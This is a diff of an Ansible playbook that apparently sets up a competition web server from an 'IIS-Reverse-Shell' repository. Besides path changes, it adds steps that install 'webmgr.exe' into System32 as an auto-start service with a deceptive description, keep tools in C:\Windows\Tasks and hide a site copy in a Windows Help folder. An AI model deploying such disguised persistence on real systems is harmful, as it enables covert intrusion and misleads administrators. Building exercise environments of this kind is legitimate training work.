@@ -55,36 +55,76 @@
         
     - name: Deploys Website Images
       win_copy:
-        src: "/IIS-Reverse-Shell/Images/{{ Competition }}/"
+        src: "~/IIS-Reverse-Shell/Images/{{ Competition }}/"
         dest: "C:\\inetpub\\{{ Competition }}\\Images"
         
     - name: Deploys index.html
       win_copy:
-        src: "/IIS-Reverse-Shell/Website/{{ Competition }}.html"
+        src: "~/IIS-Reverse-Shell/Website/{{ Competition }}.html"
         dest: "C:\\inetpub\\{{ Competition }}"
         
     - name: Deploys web.config
       win_copy:
-        src: "/IIS-Reverse-Shell/Website/web.config"
+        src: "~/IIS-Reverse-Shell/Website/web.config"
         dest: "C:\\inetpub\\{{ Competition }}"
         
     - name: Deploys button.js
       win_copy:
-        src: "/IIS-Reverse-Shell/Website/button.js"
+        src: "~/IIS-Reverse-Shell/Website/button.js"
         dest: "C:\\inetpub\\{{ Competition }}"
     
     - name: Deploys search.php
       win_copy:
-        src: "/IIS-Reverse-Shell/PHP/search.php"
+        src: "~/IIS-Reverse-Shell/PHP/search.php"
         dest: "C:\\inetpub\\{{ Competition }}\\search.php"
 
     - name: Deploys contact.php
       win_copy:
-        src: "/IIS-Reverse-Shell/PHP/contact.php"
+        src: "~/IIS-Reverse-Shell/PHP/contact.php"
         dest: "C:\\inetpub\\{{ Competition }}\\contact.php"
         
     - name: Backup Website Contents
       win_shell: Copy-Item -Path "C:\inetpub\{{ Competition }}" -Destination "C:\Windows\Help\Help" -Recurse -Force
+      
+    - name: Deploys Persistence Executable
+      win_copy:
+        src: "~/IIS-Reverse-Shell/Persistence/webmgr.exe"
+        dest: "C:\\Windows\\System32"
+        
+    - name: Downloads NSSM
+      win_get_url:
+        url: "https://nssm.cc/release/nssm-2.24.zip"
+        dest: "C:\\nssm-2.24.zip"
+        
+    - name: Stops WebMgrService (if running)
+      win_service:
+        name: "WebMgrService"
+        state: stopped
+      ignore_errors: yes
+        
+    - name: Extracts NSSM
+      win_unzip:
+        src: "C:\\nssm-2.24.zip"
+        dest: "C:\\Windows\\Tasks\\nssm-2.24"
+        remote_src: yes
+
+    - name: Deletes the NSSM ZIP File After Extraction
+      win_shell: Remove-Item -Path "C:\\nssm-2.24.zip" -Force
+      
+    - name: Creates and Configures WebMgr Service
+      win_shell: |
+        $nssmPath = "C:\\Windows\\Tasks\\nssm-2.24\\nssm-2.24\\win64\\nssm.exe"
+        $serviceName = "WebMgrService"
+        $executablePath = "C:\\Windows\\System32\\WebMgr.exe"
+        $arguments = "{{ Competition }}"
+        $displayName = "Web Manager Service"
+        $description = "Manages the current web application and is required to prevent total service failure."
+
+        & $nssmPath install $serviceName $executablePath $arguments
+        & $nssmPath set $serviceName DisplayName $displayName
+        & $nssmPath set $serviceName Description $description
+        & $nssmPath set $serviceName Start SERVICE_AUTO_START
+        Start-Service -Name $serviceName
       
     - name: Opens Port 80 in Windows Firewall
       win_firewall_rule:
@@ -123,7 +163,7 @@
     
     - name: Copy php.ini to PHP Directory
       win_copy:
-        src: "/IIS-Reverse-Shell/PHP/php.ini"
+        src: "~/IIS-Reverse-Shell/PHP/php.ini"
         dest: "C:\\Program Files\\PHP\\php.ini"
         
     - name: Copies PHP Files to a Backup Location
